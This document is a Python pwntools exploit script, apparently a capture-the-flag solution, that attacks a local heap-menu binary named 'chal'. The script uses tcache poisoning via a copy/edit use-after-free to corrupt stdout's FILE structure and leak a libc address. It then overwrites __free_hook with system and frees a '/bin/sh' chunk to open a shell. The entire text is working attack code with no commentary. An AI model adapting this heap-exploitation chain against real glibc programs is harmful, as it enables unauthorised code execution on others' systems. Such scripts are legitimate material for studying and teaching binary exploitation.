from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

def add(idx, size):
    p.sendlineafter("> ", b'1')
    p.sendlineafter("> ", str(idx))
    p.sendlineafter("> ", str(size))

def delete(idx):
    p.sendlineafter("> ", b'2')
    p.sendlineafter("> ", str(idx))

def edit(idx, content):
    p.sendlineafter("> ", b'3')
    p.sendlineafter("> ", str(idx))
    p.sendafter("> ", content)

def copy(idx1, idx2):
    p.sendlineafter("> ", b'4')
    p.sendlineafter("> ", str(idx1))
    p.sendlineafter("> ", str(idx2))

p = process('./chal')
elf = ELF('./chal')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

add(0, 0x500)
add(1, 0x10)
delete(0)
add(2, 0x100)
add(3, 0x100)
add(4, 0x100)
add(5, 0x1d0)

delete(3)
delete(2)

copy(2, 4)
edit(2, b'\xa0\x86')
add(6, 0x100)
add(7, 0x100)

edit(7, p64(0xfbad1800) + p64(0) * 3 + b'\x00')

libc.address = u64(p.recvline()[0x8:0x10]) - 0x1ec980

free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

add(8, 0x70)
add(9, 0x70)
delete(9)
delete(8)
edit(8, p64(free_hook))
edit(9, b'/bin/sh\x00')
add(10, 0x70)
add(11, 0x70)
edit(11, p64(system))
delete(9)

p.interactive()
